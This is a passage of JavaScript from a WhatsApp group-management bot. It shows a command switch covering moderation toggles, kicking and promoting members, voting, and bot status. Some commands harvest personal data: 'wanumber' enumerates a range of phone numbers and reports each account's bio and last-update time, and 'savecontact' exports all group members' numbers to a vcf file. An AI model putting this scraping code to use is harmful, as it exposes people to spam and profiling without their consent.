            replygcXlicon(`${command} is enabled`);
          } else if (args[0] === "off") {
            db.data.chats[from].antibot = false;
            replygcXlicon(`${command} is disabled`);
          }
        }
        break;
      case "antiviewonce":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!isBotAdmins) return XliconStickBotAdmin();
          if (!isAdmins && !XeonTheCreator) return XliconStickAdmin();
          if (args.length < 1) return replygcXlicon("*_on/off?_*");
          if (args[0] === "on") {
            db.data.chats[from].antiviewonce = true;
            replygcXlicon(`${command} is enabled`);
          } else if (args[0] === "off") {
            db.data.chats[from].antiviewonce = false;
            replygcXlicon(`${command} is disabled`);
          }
        }
        break;
      case "antimedia":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!isBotAdmins) return XliconStickBotAdmin();
          if (!isAdmins && !XeonTheCreator) return XliconStickAdmin();
          if (args.length < 1) return replygcXlicon("*_on/off?_*");
          if (args[0] === "on") {
            db.data.chats[from].antimedia = true;
            replygcXlicon(`${command} is enabled`);
          } else if (args[0] === "off") {
            db.data.chats[from].antimedia = false;
            replygcXlicon(`${command} is disabled`);
          }
        }
        break;
      case "antidocument":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!isBotAdmins) return XliconStickBotAdmin();
          if (!isAdmins && !XeonTheCreator) return XliconStickAdmin();
          if (args.length < 1) return replygcXlicon("*_on/off?_*");
          if (args[0] === "on") {
            db.data.chats[from].antidocument = true;
            replygcXlicon(`${command} is enabled`);
          } else if (args[0] === "off") {
            db.data.chats[from].antidocument = false;
            replygcXlicon(`${command} is disabled`);
          }
        }
        break;
      case "anticontact":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!isBotAdmins) return XliconStickBotAdmin();
          if (!isAdmins && !XeonTheCreator) return XliconStickAdmin();
          if (args.length < 1) return replygcXlicon("*_on/off?_*");
          if (args[0] === "on") {
            db.data.chats[from].anticontact = true;
            replygcXlicon(`${command} is enabled`);
          } else if (args[0] === "off") {
            db.data.chats[from].anticontact = false;
            replygcXlicon(`${command} is disabled`);
          }
        }
        break;
      case "antilocation":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!isBotAdmins) return XliconStickBotAdmin();
          if (!isAdmins && !XeonTheCreator) return XliconStickAdmin();
          if (args.length < 1) return replygcXlicon("*_on/off?_*");
          if (args[0] === "on") {
            db.data.chats[from].antilocation = true;
            replygcXlicon(`${command} is enabled`);
          } else if (args[0] === "off") {
            db.data.chats[from].antilocation = false;
            replygcXlicon(`${command} is disabled`);
          }
        }
        break;
      case "antilink":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!isBotAdmins) return XliconStickBotAdmin();
          if (!isAdmins && !XeonTheCreator) return XliconStickAdmin();
          if (args.length < 1) return replygcXlicon("*_on/off?_*");
          if (args[0] === "on") {
            db.data.chats[from].antilink = true;
            replygcXlicon(`${command} is enabled`);
          } else if (args[0] === "off") {
            db.data.chats[from].antilink = false;
            replygcXlicon(`${command} is disabled`);
          }
        }
        break;
      case "antilinkgc":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!isBotAdmins) return XliconStickBotAdmin();
          if (!isAdmins && !XeonTheCreator) return XliconStickAdmin();
          if (args.length < 1) return replygcXlicon("*_on/off?_*");
          if (args[0] === "on") {
            db.data.chats[from].antilinkgc = true;
            replygcXlicon(`${command} is enabled`);
          } else if (args[0] === "off") {
            db.data.chats[from].antilinkgc = false;
            replygcXlicon(`${command} is disabled`);
          }
        }
        break;
      case "welcome":
      case "left":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!isAdmins && !XeonTheCreator) return XliconStickAdmin();
          if (args.length < 1) return replygcXlicon("*_on/off?_*");
          if (args[0] === "on") {
            welcome = true;
            replygcXlicon(`${command} is enabled`);
          } else if (args[0] === "off") {
            welcome = false;
            replygcXlicon(`${command} is disabled`);
          }
        }
        break;
      case "adminevent":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!isAdmins && !XeonTheCreator) return XliconStickAdmin();
          if (args.length < 1) return replygcXlicon("*_on/off?_*");
          if (args[0] === "on") {
            adminevent = true;
            replygcXlicon(`${command} is enabled`);
          } else if (args[0] === "off") {
            adminevent = false;
            replygcXlicon(`${command} is disabled`);
          }
        }
        break;
      case "groupevent":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!isAdmins && !XeonTheCreator) return XliconStickAdmin();
          if (args.length < 1) return replygcXlicon("*_on/off?_*");
          if (args[0] === "on") {
            groupevent = true;
            replygcXlicon(`${command} is enabled`);
          } else if (args[0] === "off") {
            groupevent = false;
            replygcXlicon(`${command} is disabled`);
          }
        }
        break;
      case "invite":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!isBotAdmins) return XliconStickBotAdmin();
          if (!text)
            return replygcXlicon(
              `*_Enter the number you want to invite to the group_*\n\nExample :\n*${
                prefix + command
              }* 916909137213`
            );
          if (text.includes("+"))
            return replygcXlicon(`*_Enter the number together without_* *+*`);
          if (isNaN(text))
            return replygcXlicon(
              `*_Enter only the numbers plus your country code without spaces_*`
            );
          let group = m.chat;
          let link =
            "https://chat.whatsapp.com/" +
            (await XliconBotInc.groupInviteCode(group));
          await XliconBotInc.sendMessage(text + "@s.whatsapp.net", {
            text: `≡ *GROUP INVITATION*\n\nA user invites you to join this group \n\n${link}`,
            mentions: [m.sender],
          });
          replygcXlicon(` *_An invite link is sent to the user_* `);
        }
        break;
      case "closetime":
        if (!m.isGroup) return XeonStickGroup();
        if (!isAdmins && !XeonTheCreator) return XliconStickAdmin();
        if (!isBotAdmins) return XliconStickBotAdmin();
        if (args[1] == "second") {
          var timer = args[0] * `1000`;
        } else if (args[1] == "minute") {
          var timer = args[0] * `60000`;
        } else if (args[1] == "hour") {
          var timer = args[0] * `3600000`;
        } else if (args[1] == "day") {
          var timer = args[0] * `86400000`;
        } else {
          return replygcXlicon(
            "*select:*\nsecond\nminute\nhour\n\n*Example*\n10 second"
          );
        }
        replygcXlicon(`Close time ${q} starting from now`);
        setTimeout(() => {
          var nomor = m.participant;
          const close = `*Close time* group closed by admin\nnow only admin can send messages`;
          XliconBotInc.groupSettingUpdate(m.chat, "announcement");
          replygcXlicon(close);
        }, timer);
        break;
      case "opentime":
        if (!m.isGroup) return XeonStickGroup();
        if (!isAdmins && !XeonTheCreator) return replygcXlicon(mess.admin);
        if (!isBotAdmins) return XliconStickBotAdmin();
        if (args[1] == "second") {
          var timer = args[0] * `1000`;
        } else if (args[1] == "minute") {
          var timer = args[0] * `60000`;
        } else if (args[1] == "hour") {
          var timer = args[0] * `3600000`;
        } else if (args[1] == "day") {
          var timer = args[0] * `86400000`;
        } else {
          return replygcXlicon(
            "*select:*\nsecond\nminute\nhour\n\n*example*\n10 second"
          );
        }
        replygcXlicon(`Open time ${q} starting from now`);
        setTimeout(() => {
          var nomor = m.participant;
          const open = `*Open time* the group was opened by admin\n now members can send messages`;
          XliconBotInc.groupSettingUpdate(m.chat, "not_announcement");
          replygcXlicon(open);
        }, timer);
        break;
      case "kick":
        if (!isAdmins && !isGroupOwner && !XeonTheCreator)
          return XliconStickAdmin();
        if (!m.isGroup) return XeonStickGroup();
        if (!isAdmins && !isGroupOwner && !XeonTheCreator)
          return XliconStickAdmin();
        if (!isBotAdmins) return XliconStickBotAdmin();
        let blockwww = m.mentionedJid[0]
          ? m.mentionedJid[0]
          : m.quoted
          ? m.quoted.sender
          : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        await XliconBotInc.groupParticipantsUpdate(
          m.chat,
          [blockwww],
          "remove"
        );
        replygcXlicon(mess.done);
        break;
      case "idgroup":
      case "groupid":
        {
          if (!XeonTheCreator) return XliconStickOwner();
          let getGroups = await XliconBotInc.groupFetchAllParticipating();
          let groups = Object.entries(getGroups)
            .slice(0)
            .map((entry) => entry[1]);
          let anu = groups.map((v) => v.id);
          let teks = `⬣ *GROUP LIST BELOW*\n\nTotal Group : ${anu.length} Group\n\n`;
          for (let x of anu) {
            let metadata2 = await XliconBotInc.groupMetadata(x);
            teks += `◉ Name : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`;
          }
          replygcXlicon(
            teks +
              `To Use Please Type Command ${prefix}pushcontact idgroup|teks\n\nBefore using, please first copy the group id above`
          );
        }
        break;
      case "wanumber":
      case "nowa":
      case "searchno":
      case "searchnumber":
        {
          if (!text)
            return replygcXlicon(
              `*_Provide Number with last number x_*\n\nExample: ${
                prefix + command
              } 91690913721x`
            );
          var inputnumber = text.split(" ")[0];

          replygcXlicon(`*_Searching for WhatsApp account in given range..._*`);
          function countInstances(string, word) {
            return string.split(word).length - 1;
          }
          var number0 = inputnumber.split("x")[0];
          var number1 = inputnumber.split("x")[countInstances(inputnumber, "x")]
            ? inputnumber.split("x")[countInstances(inputnumber, "x")]
            : "";
          var random_length = countInstances(inputnumber, "x");
          var randomxx;
          if (random_length == 1) {
            randomxx = 10;
          } else if (random_length == 2) {
            randomxx = 100;
          } else if (random_length == 3) {
            randomxx = 1000;
          }
          var text66 = `*==[ List of Whatsapp Numbers ]==*\n\n`;
          var nobio = `\n*Bio:* || \nHey there! I am using WhatsApp.\n`;
          var nowhatsapp = `\n*Numbers with no WhatsApp account within provided range.*\n`;
          for (let i = 0; i < randomxx; i++) {
            var nu = ["1", "2", "3", "4", "5", "6", "7", "8", "9"];
            var status1 = nu[Math.floor(Math.random() * nu.length)];
            var status2 = nu[Math.floor(Math.random() * nu.length)];
            var status3 = nu[Math.floor(Math.random() * nu.length)];
            var dom4 = nu[Math.floor(Math.random() * nu.length)];
            var random21;
            if (random_length == 1) {
              random21 = `${status1}`;
            } else if (random_length == 2) {
              random21 = `${status1}${status2}`;
            } else if (random_length == 3) {
              random21 = `${status1}${status2}${status3}`;
            } else if (random_length == 4) {
              random21 = `${status1}${status2}${status3}${dom4}`;
            }
            var anu = await XliconBotInc.onWhatsApp(
              `${number0}${i}${number1}@s.whatsapp.net`
            );
            var anuu = anu.length !== 0 ? anu : false;
            try {
              try {
                var anu1 = await XliconBotInc.fetchStatus(anu[0].jid);
              } catch {
                var anu1 = "401";
              }
              if (anu1 == "401" || anu1.status.length == 0) {
                nobio += `wa.me/${anu[0].jid.split("@")[0]}\n`;
              } else {
                text66 += `🪀 *Number:* wa.me/${
                  anu[0].jid.split("@")[0]
                }\n 🎗️*Bio :* ${anu1.status}\n🧐*Last update :* ${moment(
                  anu1.setAt
                )
                  .tz("Asia/Karachi")
                  .format("HH:mm:ss DD/MM/YYYY")}\n\n`;
              }
            } catch {
              nowhatsapp += `${number0}${i}${number1}\n`;
            }
          }
          replygcXlicon(`${text66}${nobio}${nowhatsapp}`);
        }
        break;
      case "getcontact":
      case "getcon":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!(isGroupAdmins || XeonTheCreator)) return XliconStickAdmin();
          xeonbigpp = await XliconBotInc.sendMessage(
            m.chat,
            {
              text: `\nGroup: *${groupMetadata.subject}*\nMember: *${participants.length}*`,
            },
            { quoted: m, ephemeralExpiration: 86400 }
          );
          await sleep(1000);
          XliconBotInc.sendContact(
            m.chat,
            participants.map((a) => a.id),
            xeonbigpp
          );
        }
        break;
      case "savecontact":
      case "svcontact":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!(isGroupAdmins || XeonTheCreator)) return XliconStickAdmin();
          let cmiggc = await XliconBotInc.groupMetadata(m.chat);
          let orgiggc = participants.map((a) => a.id);
          vcard = "";
          noPort = 0;
          for (let a of cmiggc.participants) {
            vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${
              a.id.split("@")[0]
            }\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${
              a.id.split("@")[0]
            }\nEND:VCARD\n`;
          }
          let nmfilect = "./contacts.vcf";
          replygcXlicon(
            "\nBe patient bro, saving... " +
              cmiggc.participants.length +
              " contact"
          );
          require("fs").writeFileSync(nmfilect, vcard.trim());
          await sleep(2000);
          XliconBotInc.sendMessage(
            m.chat,
            {
              document: require("fs").readFileSync(nmfilect),
              mimetype: "text/vcard",
              fileName: "Contact.vcf",
              caption:
                "\nSucceed\nGroup: *" +
                cmiggc.subject +
                "*\nContact: *" +
                cmiggc.participants.length +
                "*",
            },
            { ephemeralExpiration: 86400, quoted: m }
          );
          require("fs").unlinkSync(nmfilect);
        }
        break;
      case "sendcontact":
      case "sencontact":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!m.mentionedJid[0])
            return replygcXlicon(
              "\nUse like this\n Example:.sendcontact @tag|name"
            );
          let snTak = text.split(" ")[1] ? text.split(" ")[1] : "Contact";
          let snContact = {
            displayName: "Contact",
            contacts: [
              {
                displayName: snTak,
                vcard:
                  "BEGIN:VCARD\nVERSION:3.0\nN:;" +
                  snTak +
                  ";;;\nFN:" +
                  snTak +
                  "\nitem1.TEL;waid=" +
                  m.mentionedJid[0].split("@")[0] +
                  ":" +
                  m.mentionedJid[0].split("@")[0] +
                  "\nitem1.X-ABLabel:Mobile\nEND:VCARD",
              },
            ],
          };
          XliconBotInc.sendMessage(
            m.chat,
            { contacts: snContact },
            { ephemeralExpiration: 86400 }
          );
        }
        break;
      case "contacttag":
      case "contag":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!(isGroupAdmins || XeonTheCreator)) return XliconStickAdmin();
          if (!m.mentionedJid[0])
            return replygcXlicon(
              "\nUse like this\n Example:.contacttag @tag|name"
            );
          let sngTak = text.split(" ")[1] ? text.split(" ")[1] : "Contact";
          let sngContact = {
            displayName: "Contact",
            contacts: [
              {
                displayName: sngTak,
                vcard:
                  "BEGIN:VCARD\nVERSION:3.0\nN:;" +
                  sngTak +
                  ";;;\nFN:" +
                  sngTak +
                  "\nitem1.TEL;waid=" +
                  m.mentionedJid[0].split("@")[0] +
                  ":" +
                  m.mentionedJid[0].split("@")[0] +
                  "\nitem1.X-ABLabel:Mobile\nEND:VCARD",
              },
            ],
          };
          XliconBotInc.sendMessage(
            m.chat,
            { contacts: sngContact, mentions: participants.map((a) => a.id) },
            { ephemeralExpiration: 86400 }
          );
        }
        break;
      case "add":
        if (!m.isGroup) return XeonStickGroup();
        if (!XeonTheCreator) return XliconStickOwner();
        if (!isBotAdmins) return XliconStickBotAdmin();
        let blockwwww = m.quoted
          ? m.quoted.sender
          : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        await XliconBotInc.groupParticipantsUpdate(m.chat, [blockwwww], "add");
        replygcXlicon(mess.done);
        break;
      case "promote":
        if (!m.isGroup) return XeonStickGroup();
        if (!isAdmins && !isGroupOwner && !XeonTheCreator)
          return XliconStickAdmin();
        if (!isBotAdmins) return XliconStickBotAdmin();
        let blockwwwww = m.mentionedJid[0]
          ? m.mentionedJid[0]
          : m.quoted
          ? m.quoted.sender
          : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        await XliconBotInc.groupParticipantsUpdate(
          m.chat,
          [blockwwwww],
          "promote"
        );
        replygcXlicon(mess.done);
        break;
      case "demote":
        if (!m.isGroup) return XeonStickGroup();
        if (!isAdmins && !isGroupOwner && !XeonTheCreator)
          return XliconStickAdmin();
        if (!isBotAdmins) return XliconStickBotAdmin();
        let blockwwwwwa = m.mentionedJid[0]
          ? m.mentionedJid[0]
          : m.quoted
          ? m.quoted.sender
          : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        await XliconBotInc.groupParticipantsUpdate(
          m.chat,
          [blockwwwwwa],
          "demote"
        );
        replygcXlicon(mess.done);
        break;
      case "setnamegc":
      case "setsubject":
        if (!m.isGroup) return XeonStickGroup();
        if (!isAdmins && !isGroupOwner && !XeonTheCreator)
          return XliconStickAdmin();
        if (!isBotAdmins) return XliconStickBotAdmin();
        if (!text) return replygcXlicon("*_Text ?_*");
        await XliconBotInc.groupUpdateSubject(m.chat, text);
        replygcXlicon(mess.done);
        break;
      case "userjid":
        {
          if (!XeonTheCreator) return XliconStickOwner();
          const groupMetadata = m.isGroup
            ? await XliconBotInc.groupMetadata(m.chat).catch((e) => {})
            : "";
          const participants = m.isGroup
            ? await groupMetadata.participants
            : "";
          let textt = `_Here is jid address of all users of_\n *- ${groupMetadata.subject}*\n\n`;
          for (let mem of participants) {
            textt += `${themeemoji} ${mem.id}\n`;
          }
          replygcXlicon(textt);
        }
        break;
      case "creategc":
      case "creategroup":
        {
          if (!XeonTheCreator) return XliconStickOwner();
          if (!args.join(" "))
            return replygcXlicon(`Use ${prefix + command} groupname`);
          try {
            let cret = await XliconBotInc.groupCreate(args.join(" "), []);
            let response = await XliconBotInc.groupInviteCode(cret.id);
            const teksop = `     「 Create Group 」

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000)
              .tz("Asia/Karachi")
              .format("DD/MM/YYYY HH:mm:ss")}

https://chat.whatsapp.com/${response}`;
            XliconBotInc.sendMessage(
              m.chat,
              {
                text: teksop,
                mentions: await XliconBotInc.parseMention(teksop),
              },
              { quoted: m }
            );
          } catch {
            replygcXlicon(`*_Error_*`);
          }
        }
        break;
      case "setbotbio":
        {
          if (!XeonTheCreator) return XliconStickOwner();
          if (!text)
            return replygcXlicon(
              `Where is the text?\nExample: ${prefix + command} XLICON-MD`
            );
          await XliconBotInc.updateProfileStatus(text);
          replygcXlicon(`*_Success in changing the bio of bot's number_*`);
        }
        break;
      case "deleteppgroup":
      case "delppgc":
      case "deleteppgc":
      case "delppgroup":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!isAdmins && !XeonTheCreator) return XliconStickAdmin();
          if (!isBotAdmins) return XliconStickBotAdmin();
          await XliconBotInc.removeProfilePicture(from);
        }
        break;
      case "deleteppbot":
      case "delppbot":
        {
          if (!XeonTheCreator) return XliconStickOwner();
          await XliconBotInc.removeProfilePicture(XliconBotInc.user.id);
          replygcXlicon(`*_Success in deleting bot's profile picture_*`);
        }
        break;
      case "setdesc":
      case "setdesk":
        if (!m.isGroup) return XeonStickGroup();
        if (!isAdmins && !isGroupOwner && !XeonTheCreator)
          return XliconStickAdmin();
        if (!isBotAdmins) return XliconStickBotAdmin();
        if (!text) return replygcXlicon("*_Text ?_*");
        await XliconBotInc.groupUpdateDescription(m.chat, text);
        replygcXlicon(mess.done);
        break;
      case "setppgroup":
      case "setppgrup":
      case "setppgc":
      case "setgrouppp":
      case "setgruppp":
      case "setgcpp":
        if (!m.isGroup) return XeonStickGroup();
        if (!isAdmins) return replygcXlicon(mess.admin);
        if (!isBotAdmins) return XliconStickBotAdmin();
        if (!quoted)
          return replygcXlicon(
            `Send/Reply Image With Caption ${prefix + command}`
          );
        if (!/image/.test(mime))
          return replygcXlicon(
            `Send/Reply Image Caption Caption ${prefix + command}`
          );
        if (/webp/.test(mime))
          return replygcXlicon(
            `Send/Reply Image With Caption ${prefix + command}`
          );
        var medis = await XliconBotInc.downloadAndSaveMediaMessage(
          quoted,
          "ppbot.jpeg"
        );
        if (args[0] == "full") {
          var { img } = await generateProfilePicture(medis);
          await XliconBotInc.query({
            tag: "iq",
            attrs: {
              to: m.chat,
              type: "set",
              xmlns: "w:profile:picture",
            },
            content: [
              {
                tag: "picture",
                attrs: {
                  type: "image",
                },
                content: img,
              },
            ],
          });
          fs.unlinkSync(medis);
          replygcXlicon(mess.done);
        } else {
          var memeg = await XliconBotInc.updateProfilePicture(m.chat, {
            url: medis,
          });
          fs.unlinkSync(medis);
          replygcXlicon(mess.done);
        }
        break;
      case "tagall":
      case "tag":
        if (!m.isGroup) return XeonStickGroup();
        if (!isAdmins && !isGroupOwner && !XeonTheCreator)
          return XliconStickAdmin();
        if (!isBotAdmins) return XliconStickBotAdmin();
        let me = m.sender;
        let teks = `╚»˙·٠${themeemoji}●♥ Tag All ♥●${themeemoji}٠·˙«╝\n😶 *Tagger :*  @${
          me.split("@")[0]
        }\n🌿 *Message : ${q ? q : "no message"}*\n\n`;
        for (let mem of participants) {
          teks += `${themeemoji} @${mem.id.split("@")[0]}\n`;
        }
        XliconBotInc.sendMessage(
          m.chat,
          {
            text: teks,
            mentions: participants.map((a) => a.id),
          },
          {
            quoted: m,
          }
        );
        break;
      case "hidetag":
        if (!m.isGroup) return XeonStickGroup();
        if (!isAdmins && !isGroupOwner && !XeonTheCreator)
          return XliconStickAdmin();
        if (!isBotAdmins) return XliconStickBotAdmin();
        XliconBotInc.sendMessage(
          m.chat,
          {
            text: q ? q : "",
            mentions: participants.map((a) => a.id),
          },
          {
            quoted: m,
          }
        );
        break;
      case "totag":
        if (!m.isGroup) return XeonStickGroup();
        if (!isBotAdmins) return XliconStickBotAdmin();
        if (!isAdmins) return replygcXlicon(mess.admin);
        if (!m.quoted)
          return replygcXlicon(`Reply media with caption ${prefix + command}`);
        XliconBotInc.sendMessage(m.chat, {
          forward: m.quoted.fakeObj,
          mentions: participants.map((a) => a.id),
        });
        break;
      case "group":
      case "grup":
        if (!m.isGroup) return XeonStickGroup();
        if (!isAdmins && !isGroupOwner && !XeonTheCreator)
          return XliconStickAdmin();
        if (!isBotAdmins) return XliconStickBotAdmin();
        if (args[0] === "close") {
          await XliconBotInc.groupSettingUpdate(m.chat, "announcement").then(
            (res) => replygcXlicon(`Success Closing Group`)
          );
        } else if (args[0] === "open") {
          await XliconBotInc.groupSettingUpdate(
            m.chat,
            "not_announcement"
          ).then((res) => replygcXlicon(`Success Opening Group`));
        } else {
          replygcXlicon(
            `Mode ${command}\n\n\nKetik ${prefix + command}open/close`
          );
        }
        break;
      case "editinfo":
        if (!m.isGroup) return XeonStickGroup();
        if (!isAdmins && !isGroupOwner && !XeonTheCreator)
          return XliconStickAdmin();
        if (!isBotAdmins) return XliconStickBotAdmin();
        if (args[0] === "open") {
          await XliconBotInc.groupSettingUpdate(m.chat, "unlocked").then(
            (res) => replygcXlicon(`Successfully Opened Edit Group Info`)
          );
        } else if (args[0] === "close") {
          await XliconBotInc.groupSettingUpdate(m.chat, "locked").then((res) =>
            replygcXlicon(`Successfully Closed Edit Group Info`)
          );
        } else {
          replygcXlicon(`Mode ${command}\n\n\nType ${prefix + command}on/off`);
        }
        break;
      case "linkgroup":
      case "linkgrup":
      case "linkgc":
      case "gclink":
      case "grouplink":
      case "gruplink":
        if (!m.isGroup) return XeonStickGroup();
        if (!isAdmins && !isGroupOwner && !XeonTheCreator)
          return XliconStickAdmin();
        if (!isBotAdmins) return XliconStickBotAdmin();
        let response = await XliconBotInc.groupInviteCode(m.chat);
        XliconBotInc.sendText(
          m.chat,
          `👥 *GROUP LINK*\n📛 *Name :* ${
            groupMetadata.subject
          }\n👤 *Owner Grup :* ${
            groupMetadata.owner !== undefined
              ? "+" + groupMetadata.owner.split`@`[0]
              : "Not known"
          }\n🌱 *ID :* ${
            groupMetadata.id
          }\n🔗 *Chat Link :* https://chat.whatsapp.com/${response}\n👥 *Member :* ${
            groupMetadata.participants.length
          }\n`,
          m,
          {
            detectLink: true,
          }
        );
        break;
      case "getbio":
        {
          try {
            let who;
            if (m.isGroup)
              who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender;
            else who = m.quoted.sender ? m.quoted.sender : m.sender;
            let bio = await XliconBotInc.fetchStatus(who);
            replygcXlicon(bio.status);
          } catch {
            if (text)
              return replygcXlicon(
                `bio is private or you haven't replied to the person's message!`
              );
            else
              try {
                let who = m.quoted ? m.quoted.sender : m.sender;
                let bio = await XliconBotInc.fetchStatus(who);
                replygcXlicon(bio.status);
              } catch {
                return replygcXlicon(
                  `bio is private or you haven't replied to the person's message!`
                );
              }
          }
        }
        break;
        break;
      case "vote":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (m.chat in vote)
            return replygcXlicon(
              `_There are still votes in this chat!_\n\n*${prefix}deletevote* - to delete votes`
            );
          if (!text)
            return replygcXlicon(
              `Enter Reason for Vote, Example: *${
                prefix + command
              } Handsome Owner*`
            );
          replygcXlicon(
            `Voting starts!\n\n*${prefix}upvote* - for upvote\n*${prefix}downvote* - for downvote\n*${prefix}checkvote* - to check the vote\n*${prefix}deletevote* - to delete vote`
          );
          vote[m.chat] = [q, [], []];
          await sleep(1000);
          upvote = vote[m.chat][1];
          devote = vote[m.chat][2];
          teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
│
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
│
│ 
└────

Please Type Below
*${prefix}upvote* - to cast vote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`;
          XliconBotInc.sendMessage(m.chat, { text: teks_vote }, { quoted: m });
        }
        break;
      case "upvote":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!(m.chat in vote))
            return replygcXlicon(
              `_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`
            );
          isVote = vote[m.chat][1].concat(vote[m.chat][2]);
          wasVote = isVote.includes(m.sender);
          if (wasVote) return replygcXlicon("You have Voted");
          vote[m.chat][1].push(m.sender);
          menvote = vote[m.chat][1].concat(vote[m.chat][2]);
          teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join("\n")}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join("\n")}
│ 
└────

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`;
          XliconBotInc.sendMessage(
            m.chat,
            { text: teks_vote, mentions: menvote },
            { quoted: m }
          );
        }
        break;
      case "downvote":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!(m.chat in vote))
            return replygcXlicon(
              `_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`
            );
          isVote = vote[m.chat][1].concat(vote[m.chat][2]);
          wasVote = isVote.includes(m.sender);
          if (wasVote) return replygcXlicon("You have Voted");
          vote[m.chat][2].push(m.sender);
          menvote = vote[m.chat][1].concat(vote[m.chat][2]);
          teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join("\n")}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join("\n")}
│ 
└────

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`;
          XliconBotInc.sendMessage(
            m.chat,
            { text: teks_vote, mentions: menvote },
            { quoted: m }
          );
        }
        break;

      case "checkvote":
        if (!m.isGroup) return XeonStickGroup();
        if (!(m.chat in vote))
          return replygcXlicon(
            `_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`
          );
        teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join("\n")}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join("\n")}
│ 
└────

*${prefix}deletevote* - to delete votes


©${XliconBotInc.user.id}
`;
        XliconBotInc.sendTextWithMentions(m.chat, teks_vote, m);
        break;
      case "deletevote":
      case "delvote":
      case "hapusvote":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!(m.chat in vote))
            return replygcXlicon(
              `_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`
            );
          delete vote[m.chat];
          replygcXlicon("Successfully Deleted Vote Session In This Group");
        }
        break;
        break;
      case "revoke":
      case "resetlink":
        if (!m.isGroup) return XeonStickGroup();
        if (!isAdmins && !isGroupOwner && !XeonTheCreator)
          return XliconStickAdmin();
        if (!isBotAdmins) return XliconStickBotAdmin();
        await XliconBotInc.groupRevokeInvite(m.chat).then((res) => {
          replygcXlicon(`Reset Success`);
        });
        break;
      //bot status
      case "ping":
      case "botstatus":
      case "statusbot":
      case "p":
        {
          const used = process.memoryUsage();
          const cpus = os.cpus().map((cpu) => {
            cpu.total = Object.keys(cpu.times).reduce(
              (last, type) => last + cpu.times[type],
              0
            );
            return cpu;
          });
          const cpu = cpus.reduce(
            (last, cpu, _, { length }) => {
              last.total += cpu.total;
              last.speed += cpu.speed / length;
              last.times.user += cpu.times.user;
              last.times.nice += cpu.times.nice;
              last.times.sys += cpu.times.sys;
              last.times.idle += cpu.times.idle;
              last.times.irq += cpu.times.irq;
              return last;
            },
            {
              speed: 0,
              total: 0,
              times: {
                user: 0,
                nice: 0,
                sys: 0,
                idle: 0,
                irq: 0,
              },
            }
          );
          let timestamp = speed();
          let latensi = speed() - timestamp;
          neww = performance.now();
          oldd = performance.now();
          let latencySeconds = latensi.toFixed(4);
          let latencyMs = oldd - neww;
          let totalLatencyMs = Math.round(latencySeconds * 1000 + latencyMs);
          let finalStatus =
            `*Response Time*: ${totalLatencyMs}ms\n*Runtime*: ${runtime(
              process.uptime()
            )}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used)
  .map(
    (key, _, arr) =>
      `${key.padEnd(Math.max(...arr.map((v) => v.length)), " ")}: ${formatp(
        used[key]
      )}`
  )
  .join("\n")}

${
  cpus[0]
    ? `_Total CPU Usage_
